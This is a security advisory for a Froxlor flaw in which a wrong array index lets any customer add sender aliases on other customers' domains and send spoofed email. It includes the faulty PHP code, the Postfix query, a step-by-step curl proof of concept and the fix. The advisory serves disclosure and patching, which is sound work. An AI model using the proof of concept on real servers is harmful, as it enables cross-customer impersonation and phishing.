# [M] Froxlor has an Email Sender Alias Domain Ownership Bypass via Wrong Array Index Allows Cross-Customer Email Spoofing

## Summary
Severity: Medium
Advisory: GHSA-vmjj-qr7v-pxm6
CVE: CVE-2026-41232
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-vmjj-qr7v-pxm6
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.6

## Details
## Summary

In `EmailSender::add()`, the domain ownership validation for full email sender aliases uses the wrong array index when splitting the email address, passing the local part instead of the domain to `validateLocalDomainOwnership()`. This causes the ownership check to always pass for non-existent "domains," allowing any authenticated customer to add sender aliases for email addresses on domains belonging to other customers. Postfix's `sender_login_maps` then authorizes the attacker to send emails as those addresses.

## Details

In `lib/Froxlor/Api/Commands/EmailSender.php` at line 100, when a customer adds a full email address (not a `@domain` wildcard) as an allowed sender, the code splits on `@` and takes index `[0]`:

```php
// Line 96-106
if (substr($allowed_sender, 0, 1) != '@') {
    if (!Validate::validateEmail($idna_convert->encode($allowed_sender))) {
        Response::standardError('emailiswrong', $allowed_sender, true);
    }
    self::validateLocalDomainOwnership(explode("@", $allowed_sender)[0] ?? "");  // BUG: [0] is the local part
} else {
    if (!Validate::validateDomain($idna_convert->encode(substr($allowed_sender, 1)))) {
        Response::standardError('wildcardemailiswrong', substr($allowed_sender, 1), true);
    }
    self::validateLocalDomainOwnership(substr($allowed_sender, 1));  // CORRECT: passes domain
}
```

For input `admin@domain-b.com`, `explode("@", "admin@domain-b.com")` returns `["admin", "domain-b.com"]`. Index `[0]` is `"admin"` — the local part, not the domain.

The `validateLocalDomainOwnership()` function (lines 346-355) then queries `panel_domains` for a domain matching `"admin"`:

```php
private static function validateLocalDomainOwnership(string $domain): void
{
    $sel_stmt = Database::prepare("SELECT customerid FROM `" . TABLE_PANEL_DOMAINS . "` WHERE `domain` = :domain");
    $domain_result = Database::pexecute_first($sel_stmt, ['domain' => $domain]);
    if ($domain_result && $domain_result['customerid'] != CurrentUser::getField('customerid')) {
        Response::standardError('senderdomainnotowned', $domain, true);
    }
}
```

Since no domain named `"admin"` exists in `panel_domains`, `$domain_result` is false, and the function returns without error — the ownership check silently passes.

The inserted `mail_sender_aliases` row is then picked up by Postfix's `sender_login_maps` query (configured in `mysql-virtual_sender_permissions.cf`):

```sql
... UNION (SELECT mail_sender_aliases.email FROM mail_sender_aliases
WHERE mail_sender_aliases.allowed_sender = '%s') ...
```

This query maps the `allowed_sender` back to the mail user, authorizing them to send as that address via SMTP.

## PoC

```bash
# Prerequisites: Froxlor instance with mail.enable_allow_sender enabled,
# two customers: Customer A (owns domain-a.com) and Customer B (owns domain-b.com)

# Step 1: As Customer A, add a sender alias claiming Customer B's domain
# Via API:
curl -X POST 'https://froxlor-host/api/v1/' \
  -H 'Authorization: Basic <customer-A-credentials>' \
  -H 'Content-Type: application/json' \
  -d '{
    "command": "EmailSender.add",
    "params": {
      "emailaddr": "myaccount@domain-a.com",
      "allowed_sender": "ceo@domain-b.com"
    }
  }'

# Expected: Error "senderdomainnotowned" because domain-b.com belongs to Customer B
# Actual: 200 OK — alias is created because validateLocalDomainOwnership
#         receives "ceo" (local part) instead of "domain-b.com" (domain)

# Step 2: Verify the alias was inserted
curl -X POST 'https://froxlor-host/api/v1/' \
  -H 'Authorization: Basic <customer-A-credentials>' \
  -H 'Content-Type: application/json' \
  -d '{
    "command": "EmailSender.listing",
    "params": {"emailaddr": "myaccount@domain-a.com"}
  }'

# Step 3: Customer A can now send email as ceo@domain-b.com via SMTP
# because Postfix sender_login_maps will match the mail_sender_aliases entry
# and authorize Customer A's mail account to use that sender address.
```

The same attack works via the web UI by POST-ing to `customer_email.php` with `action=add_sender` and the target domain in `allowed_domain`.

## Impact

Any authenticated customer on a multi-tenant Froxlor instance can add sender aliases for email addresses on domains belonging to other customers. This allows:

- **Cross-customer email spoofing**: Send emails impersonating users on other customers' domains, bypassing Postfix's `smtpd_sender_login_maps` restriction that is specifically designed to prevent this.
- **Multi-tenant isolation breach**: The domain ownership check (`validateLocalDomainOwnership`) is the only barrier preventing cross-customer sender aliasing, and it is completely ineffective for full email addresses.
- **Phishing and reputation damage**: Spoofed emails originate from the legitimate mail server, passing SPF/DKIM checks for the target domain if those records point to the Froxlor server.

Note: The wildcard (`@domain`) code path at line 105 is **not** affected — it correctly passes the domain to `validateLocalDomainOwnership()`.

## Recommended Fix

Change index `[0]` to `[1]` on line 100 of `lib/Froxlor/Api/Commands/EmailSender.php`:

```php
// Before (line 100):
self::validateLocalDomainOwnership(explode("@", $allowed_sender)[0] ?? "");

// After:
self::validateLocalDomainOwnership(explode("@", $allowed_sender)[1] ?? "");
```

This ensures the domain part of the email address is passed to the ownership validation, matching the behavior of the wildcard path on line 105.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-vmjj-qr7v-pxm6
- https://nvd.nist.gov/vuln/detail/CVE-2026-41232
- https://github.com/froxlor/froxlor/commit/77d04badf549d5f8429828f0fbc69bc37a35e07a
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.6
